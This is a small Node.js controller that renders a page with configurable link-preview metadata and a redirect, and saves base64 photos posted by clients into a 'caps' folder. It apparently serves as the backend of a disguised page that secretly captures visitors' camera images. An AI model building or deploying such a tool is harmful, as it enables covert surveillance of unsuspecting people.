const fs = require("fs");
const { v4: uuidv4 } = require('uuid');

const HomeController = {
    index: function (req, res, next) {
        res.render('index', {
            domain: process.env.DOMAIN,
            name: process.env.METANAME,
            desc: process.env.METADESC,
            link: process.env.METALINK,
            redirect: process.env.REDIRECT
        });
    },
    savePhoto: function (req, res, next) {
        const buffer = Buffer.from(req.body.photo, "base64");
        fs.writeFileSync("caps/" + uuidv4() + ".jpg", buffer);
        res.write('ok');
    }
}

module.exports = HomeController;